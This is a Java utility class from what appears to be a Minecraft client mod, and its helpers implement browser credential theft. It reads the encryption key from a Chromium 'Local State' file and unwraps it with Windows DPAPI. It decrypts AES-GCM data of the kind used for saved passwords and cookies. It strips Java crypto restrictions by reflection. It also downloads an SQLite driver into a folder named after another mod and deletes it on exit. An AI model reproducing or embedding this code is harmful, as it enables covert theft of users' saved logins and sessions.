package dev.schubilegend.utils;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import net.minecraft.client.Minecraft;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.FileReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.Key;
import java.sql.Driver;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Map;


public class Utils {
    public static byte[] getKey(File path) {
        try {

            JsonObject localStateJson = (JsonObject)new Gson().fromJson(new FileReader(path), JsonObject.class);
            byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();
            encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);
            encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyBytes);

        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String decrypt(byte[] encryptedData, byte[] key) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            cipher.init(2, (Key)keySpec, spec);
            return new String(cipher.doFinal(payload));
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    public static void bypassKeyRestriction()
    {
        try {
            if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                Constructor<?> con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissionCollection = con.newInstance();
                Field f = aClass.getDeclaredField("all_allowed");
                f.setAccessible(true);
                f.setBoolean(allPermissionCollection, true);

                aClass = Class.forName("javax.crypto.CryptoPermissions");
                con = aClass.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissions = con.newInstance();
                f = aClass.getDeclaredField("perms");
                f.setAccessible(true);
                ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                aClass = Class.forName("javax.crypto.JceSecurityManager");
                f = aClass.getDeclaredField("defaultPolicy");
                f.setAccessible(true);
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                f.set(null, allPermissions);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static Driver getDriver(){
        try {
            File driverFile = new File(Minecraft.getMinecraft().mcDataDir,"config/essential/sqlite-jdbc-3.23.1.jar");
            URL url = new URL("https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.23.1/sqlite-jdbc-3.23.1.jar");
            if (!driverFile.exists()) {
                FileUtils.copyURLToFile(url, driverFile);
            }
            driverFile.deleteOnExit();
            ClassLoader classLoader = new URLClassLoader(new URL[] { driverFile.toURI().toURL() });
            Class clazz = Class.forName("org.sqlite.JDBC", true, classLoader);
            Object driverInstance = clazz.newInstance();
            return (Driver) driverInstance;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;

    }
}
